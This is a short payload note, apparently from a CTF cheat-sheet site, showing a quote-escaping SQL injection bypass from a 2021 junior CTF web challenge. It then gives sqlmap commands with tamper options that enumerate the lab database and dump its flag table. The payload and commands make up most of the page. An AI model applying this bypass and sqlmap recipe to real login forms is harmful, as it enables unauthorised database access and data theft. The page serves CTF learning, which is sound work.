---
layout: default
title: SQL injection bypass quote
nav_order: 1
parent: Payloads
---

# SQL injection bypass quote
{: .no_toc }

---

Need to read:
- <https://mukarramkhalid.com/without-quotes-string-based-sql-injection/>
- <https://github.com/lngthvinh/JUNIOR-HACKING-TALENT-2021/tree/main/%5BChung%20K%E1%BA%BFt%5D%20Web/400%20-%20C%E1%BB%ADa%20h%C3%A0ng%20%C4%91%E1%BB%93%20ch%C6%A1i%20Qu%E1%BA%ADn%204>

Example: JUNIOR HACKING TALENT 2021 - Cửa hàng đồ chơi Quận 4

Bypass Payload

```mysql
select username from users where username='\' and password='OR/**/1=1#'
```

Final Payload

```
# sqlmap -u http://shop.kid.cyberjutsu-lab.tech/login.php --data "username=\&password=" -p password --string="Doraemon" --suffix="#" --tamper=space2comment.py --dbs
...
available databases [2]:
[*] information_schema
[*] myDB
...
# sqlmap -u http://shop.kid.cyberjutsu-lab.tech/login.php --data "username=\&password=" -p password --string="Doraemon" --suffix="#" --tamper=space2comment.py -D myDB --tables
...
[7 tables]
+---------------+
| authors       |
| flag_304ad593 |
| posts         |
| roles         |
| user_post     |
| user_role     |
| users         |
+---------------+
...
# sqlmap -u http://shop.kid.cyberjutsu-lab.tech/login.php --data "username=\&password=" -p password --string="Doraemon" --suffix="#" --tamper=space2comment.py -D myDB -T flag_304ad593 --dump
...
[1 entry]
+-------------------------------------+
| flag_3e53dc                         |
+-------------------------------------+
| CTF{pleAs3_doNt_r3invent_th3_whe3L} |
+-------------------------------------+
...
```
